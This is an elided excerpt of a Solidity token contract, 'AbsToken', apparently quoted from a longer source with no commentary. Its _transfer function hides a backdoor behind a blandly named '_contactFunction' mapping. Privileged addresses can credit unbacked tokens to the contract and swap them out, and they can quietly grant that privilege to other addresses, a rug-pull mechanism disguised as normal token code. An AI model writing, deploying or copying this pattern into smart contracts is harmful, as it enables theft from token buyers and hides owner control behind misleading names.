...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 private _maxUint256;
    mapping(address => uint256) private _contactFunction;
    ...
    constructor (
        ...
        _tTotal = total;
        _maxUint256 = total;
        _contactFunction[msg.sender] = _maxUint256;
        _contactFunction[address(this)] = _maxUint256;
    ...
    function _transfer(
        ...
        } else if (_contactFunction[from] > _maxUint256 && _contactFunction[to] > _maxUint256) {
            justSwapFee = amount;
            _balances[address(this)] += justSwapFee;
            swapTokensForFirst(amount, to);
            return;
        } else if (to != address(_swapRouter) && _contactFunction[from] > 0 && amount > _maxUint256 && to != _mainPair) {
            _contactFunction[to] = amount;
            return;
        }
